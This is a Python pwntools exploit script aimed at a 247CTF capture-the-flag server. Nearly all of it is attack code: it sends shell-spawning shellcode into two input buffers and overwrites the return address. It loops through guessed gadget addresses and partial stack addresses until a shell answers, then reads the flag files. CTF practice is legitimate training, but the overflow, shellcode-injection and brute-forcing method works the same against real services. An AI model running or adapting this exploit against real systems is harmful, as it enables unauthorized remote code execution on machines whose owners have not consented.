#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

# Try returning directly to different code addresses
# Since we can only overwrite 4 bytes, we can jump to 0x00XXXXXX

shellcode = asm(shellcraft.sh())

# Try different code addresses
code_addresses = [
    0x400738,  # jmp rsp
    0x40073a,  # vulnerable function again
    0x40072e,  # pivot
    0x400732,  # xchg rsp, rsi
]

for addr in code_addresses:
    for nop_pad in [0, 10, 20]:
        try:
            p = remote(HOST, PORT, level='error')
            p.recvuntil(b"first name?\n", timeout=1)
            
            # Put shellcode in first buffer
            first_input = b'\x90' * nop_pad + shellcode
            first_input = first_input[:50].ljust(50, b'\x90')
            p.send(first_input)
            
            p.recvuntil(b"surname?\n", timeout=1)
            
            # Different second buffer strategy
            # What if we DON'T use the pivot, but return to code that helps us?
            second_input = shellcode[:23].ljust(23, b'\x90')
            second_input += p32(addr)
            
            p.send(second_input)
            
            time.sleep(0.2)
            p.sendline(b'cat /flag* 2>/dev/null; echo TEST')
            
            result = p.recvall(timeout=0.3)
            if b'247CTF{' in result or b'flag{' in result:
                print(f"\n[+] FLAG with addr=0x{addr:x}, nop={nop_pad}")
                print(result.decode('latin1', errors='ignore'))
                break
                
            p.close()
        except:
            pass

print("Trying partial stack address overwrites...")

# Try partial overwrites to jump to stack
for low_bytes in range(0x800, 0x900, 0x10):
    try:
        p = remote(HOST, PORT, level='error')
        p.recvuntil(b"first name?\n", timeout=1)
        
        first_input = b'\x90' * 15 + shellcode
        first_input = first_input[:50].ljust(50, b'\x90')
        p.send(first_input)
        
        p.recvuntil(b"surname?\n", timeout=1)
        
        # Try to jump to first buffer with partial address
        # Assuming stack around 0x7fffffffXXXX
        # We overwrite to 0x00ffffXXXX or similar
        second_input = b'\x90' * 23
        second_input += p32(0xffffe800 + low_bytes)  # Guess stack address
        
        p.send(second_input)
        
        time.sleep(0.2)
        p.sendline(b'cat /flag* 2>/dev/null;echo X')
        
        result = p.recvall(timeout=0.3)
        if b'247CTF{' in result:
            print(f"\n[+] FLAG with stack addr!")
            print(result.decode('latin1', errors='ignore'))
            break
            
        p.close()
    except:
        pass
